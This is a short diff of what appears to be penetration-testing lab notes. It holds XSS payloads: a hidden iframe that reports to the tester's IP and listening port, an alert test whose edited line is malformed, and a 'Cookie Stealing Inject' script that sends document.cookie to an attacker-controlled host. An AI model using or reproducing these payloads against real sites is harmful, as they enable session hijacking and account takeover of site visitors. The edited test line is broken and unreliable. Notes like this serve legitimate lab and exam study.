@@ -60,7 +60,7 @@ for ip in $(cat ./WGET/web_vuln_ips); do  tail -n +1 ./WGET/$ip/* | grep 10.11.1
 
 #### Test  
 "<iframe SRC="(use your IP):(Port to listen on) /report" height="0" width="0"></iframe>
-<script>alert("XSS through Javascript, success");</script>"  -------------
+</script>alert("XSS through Javascript, success");</script>"
 
 #### Cookie Stealing Inject  
 <script>new Image().src="http://(use your IP):81 /bogus.php?output="+document.cookie;</script>
